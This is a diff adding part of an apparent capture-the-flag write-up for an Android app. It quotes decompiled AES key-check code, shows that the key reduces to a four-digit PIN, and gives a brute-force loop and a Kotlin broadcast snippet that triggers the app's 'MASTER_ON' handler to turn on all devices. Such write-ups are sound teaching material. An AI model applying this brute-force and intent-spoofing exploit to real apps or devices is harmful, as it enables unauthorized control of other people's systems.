@@ -46,3 +46,77 @@ public final BroadcastReceiver initialize(Context context) {
 ```
 
 Next, we can see that the only condition we have to satisfy is to set "MASTER_ON" action on intent. 
+Also, we need to set a correct "key" extra data in order to enter 
+```
+CommunicationManager.INSTANCE.turnOnAllDevices(context2);
+```
+
+Key is checked in Checker.check_key method:
+```
+Checker.INSTANCE.check_key(key)
+```
+
+Below is the implementation of Checker.check_key:
+```
+public final boolean check_key(int key) {
+        try {
+            return Intrinsics.areEqual(decrypt(ds, key), "master_on");
+        } catch (BadPaddingException e) {
+            return false;
+        }
+    }
+
+    public final String decrypt(String ds2, int key) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeyException {
+        Intrinsics.checkNotNullParameter(ds2, "ds");
+        SecretKeySpec secretKey = generateKey(key);
+        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
+        cipher.init(2, secretKey);
+        if (Build.VERSION.SDK_INT >= 26) {
+            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
+            Intrinsics.checkNotNull(decryptedBytes);
+            return new String(decryptedBytes, Charsets.UTF_8);
+        }
+        throw new UnsupportedOperationException("VERSION.SDK_INT < O");
+    }
+
+    private final SecretKeySpec generateKey(int staticKey) {
+        byte[] keyBytes = new byte[16];
+        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
+        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");
+        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
+        return new SecretKeySpec(keyBytes, algorithm);
+    }
+```
+
+
+generateKey functions declaers a keyBytes array with with 16 bytes size, which translates into a max 4 number key (the rest will be zeroes for padding). 
+```
+byte[] keyBytes = new byte[16];
+```
+
+This enables us to brute force a pin and get it:
+
+```
+for (int i = 0; i <= 9999; i++) {
+            try {
+                String test = decrypt(ds, i);
+                if (test != null && test.equals("master_on")) {
+                    System.out.println(i);
+                    System.out.println(test);
+                }
+            }
+}
+```
+
+Afterwards, we can send a broadcast with something like this: 
+```
+val intentAction = "MASTER_ON"
+val intent = Intent()
+intent.setAction(intentAction)
+intent.putExtra("key", pin)
+sendBroadcast(intent)
+```
+
+<img width="1080" height="2400" alt="Screenshot_20260426-224148" src="https://github.com/user-attachments/assets/c9f377bd-af4e-41a2-9200-dd5ba9a21146" />
+
+
